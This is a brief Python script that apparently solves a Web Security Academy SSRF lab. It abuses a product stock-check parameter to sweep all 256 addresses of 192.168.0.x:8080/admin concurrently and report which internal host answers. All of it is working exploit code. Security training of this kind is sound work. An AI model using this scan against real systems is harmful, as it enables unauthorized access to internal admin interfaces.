import requests
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

def send_request(digit: int):
    url = 'https://0aa100bd0306fc3f83786ea1007d00f6.web-security-academy.net/product/stock'
    data = {
        'stockApi': f'http://192.168.0.{digit}:8080/admin'
    }
    with requests.session() as s:
        r = s.post(url=url, data=data)
        if r.status_code == 200:
            return data['stockApi']

if __name__ == '__main__':
    # Create a list to store the futures
    futures = []

    # Use ThreadPoolExecutor to send requests concurrently
    with ThreadPoolExecutor(max_workers=100) as executor:
        # Submit tasks to the executor
        for digit in range(256):
            futures.append(executor.submit(send_request, digit))

        # Use tqdm to display a progress bar
        for future in tqdm(as_completed(futures), total=256):
            result = future.result()
            if result is not None:
                print(f'Found valid Link: {result}')